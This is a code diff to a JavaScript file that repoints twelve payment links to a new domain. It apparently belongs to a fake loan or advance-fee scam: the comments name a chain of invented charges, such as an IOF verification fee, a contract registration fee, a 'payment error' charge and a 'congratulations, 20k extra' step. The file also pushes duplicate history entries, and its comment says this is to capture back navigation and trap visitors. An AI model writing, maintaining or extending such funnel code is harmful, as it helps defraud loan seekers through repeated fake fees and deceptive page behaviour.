@@ -1,16 +1,16 @@
 const baseLinks = {
-    up1: "https://pay.finalizepagamento.store/695410e9ede5279f00b12e64", // IOF
-    up2: "https://pay.finalizepagamento.store/695418c3795ed29f33a38f82", // Taxa de verificação de IOF
-    up3: "https://pay.finalizepagamento.store/69541a63a1fcd46a2127c5af", // Seguro Prestamista "tarifa de cadastro"
-    up4: "https://pay.finalizepagamento.store/69541ab8ede5279f00b13ad6", // NFe
-    up5: "https://pay.finalizepagamento.store/69541af2795ed29f33a392bb", // Ativar conta
-    up6: "https://pay.finalizepagamento.store/69541b24ede5279f00b13bda", // Taxa de registro do contrato
-    up7: "https://pay.finalizepagamento.store/69541b98a1fcd46a2127c7cb", // Parabéns, 20k adicional
-    up8: "https://pay.finalizepagamento.store/69541bd9a1fcd46a2127c832", // Erro no pagamento - 14,06
-    up9: "https://pay.finalizepagamento.store/69541c25a1fcd46a2127c8b9", // APP - 11,99
-    up10:"https://pay.finalizepagamento.store/69541c5d795ed29f33a39534", // Taxa de Abertura TAC - 16,92
-    up11:"https://pay.finalizepagamento.store/69541c99a1fcd46a2127c968", // Taxa de Consultoria Financeira - 19,53
-    up12:"https://pay.finalizepagamento.store/69541ccdede5279f00b13f04" // Taxa de Processamento Administrativo - 31,92
+    up1: "https://pay.carrinhofinaliza.site/eApQgz25R2VgEb7", // IOF
+    up2: "https://pay.carrinhofinaliza.site/mwK436dnYd4GQ8b", // Taxa de verificação de IOF
+    up3: "https://pay.carrinhofinaliza.site/BNjzgPl9mljgM78", // Seguro Prestamista "tarifa de cadastro"
+    up4: "https://pay.carrinhofinaliza.site/ODAK3LlNylb3E6V", // NFe
+    up5: "https://pay.carrinhofinaliza.site/DYp0ZxVbrVegmvX", // Ativar conta
+    up6: "https://pay.carrinhofinaliza.site/nQ7kZ7pQYpzG0eJ", // Taxa de registro do contrato
+    up7: "https://pay.carrinhofinaliza.site/RmA83EaWPaj3PVp", // Parabéns, 20k adicional
+    up8: "https://pay.carrinhofinaliza.site/2wq7Gr7dL7jgBAN", // Erro no pagamento - 14,06
+    up9: "https://pay.carrinhofinaliza.site/6YQPgjn6Lnngpxz", // APP - 11,99
+    up10:"https://pay.carrinhofinaliza.site/5pjw3RnpQnm32lQ", // Taxa de Abertura TAC - 16,92
+    up11:"https://pay.carrinhofinaliza.site/521rZJz1yzeZeaX", // Taxa de Consultoria Financeira - 19,53
+    up12:"https://pay.carrinhofinaliza.site/P5LNZ8zyYz5gaRy" // Taxa de Processamento Administrativo - 31,92
 
 };
 
@@ -34,4 +34,5 @@ function redirect(key) {
 // Adiciona duas entradas no histórico para capturar a navegação para trás
 history.pushState({}, '', location.href);
 history.pushState({}, '', location.href);
+
 
